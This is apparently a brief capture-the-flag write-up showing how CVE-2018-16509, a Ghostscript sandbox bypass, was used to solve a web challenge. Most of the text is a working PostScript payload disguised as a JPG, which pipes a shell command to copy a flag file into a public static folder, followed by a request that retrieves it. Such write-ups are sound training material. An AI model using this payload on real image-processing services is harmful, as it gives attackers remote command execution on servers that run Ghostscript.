The whole challenge was based on this CVE: "CVE-2018-16509".

So i just made this simply jpg payload:

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cp flag /app/application/static/petpets/flag.txt) currentdevice putdeviceprops

```

And finally make a get request at http://ip:port/app/application/static/petpets/flag.txt

The most difficult part was to figure out which correct rce i had to use in order to bypass the filters and execute arbitrary code however if you read the source code it should be easy to find.
